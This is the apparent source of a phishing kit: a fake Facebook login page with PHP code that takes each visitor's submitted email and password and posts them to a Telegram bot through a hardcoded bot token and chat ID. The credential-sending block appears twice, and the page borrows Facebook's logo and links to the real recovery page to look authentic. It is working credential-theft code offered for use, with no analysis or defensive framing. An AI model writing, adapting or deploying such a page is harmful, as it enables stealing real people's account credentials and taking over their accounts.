<?php
$telegramBotToken = '6508840136:AAEbL4Vse12Gtx6ek3-hZbXBKYWxnUWh7Tk';
$chatId = '6244550071';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Validate the login here (you would usually do this with a database)
    // If login is successful, proceed with Telegram message sending

    $message = "Email: $email\nPassword: $password";

    $telegramUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);
}
?>
<?php
$telegramBotToken = '6508840136:AAEbL4Vse12Gtx6ek3-hZbXBKYWxnUWh7Tk';
$chatId = '6244550071';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Validate the login here (you would usually do this with a database)
    // If login is successful, proceed with Telegram message sending

    $message = "Email: $email\nPassword: $password";

    $telegramUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);
}
?>
<!DOCTYPE html>
<html lang="en">
 <haed>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <img src="facebook-logo.png" alt="Facebook Logo">
        <h2>Facebook</h2>
        <form method="POST">
            <input type="text" id="emailOrNumber" placeholder="Email address or number" name="email" required>
            <input type="password" id="password" placeholder="Password" name="password" required>
            <button type="submit">Log In</button>
        </form>
        <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0Nw4KgpreIlqCrzUT&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_0xBbPtcE0vRtsQuOR&_rdr">Forgot Password?</a>
        <hr>
        <button class="create-account">Create New Account</button>
    </div>
</body>
</html>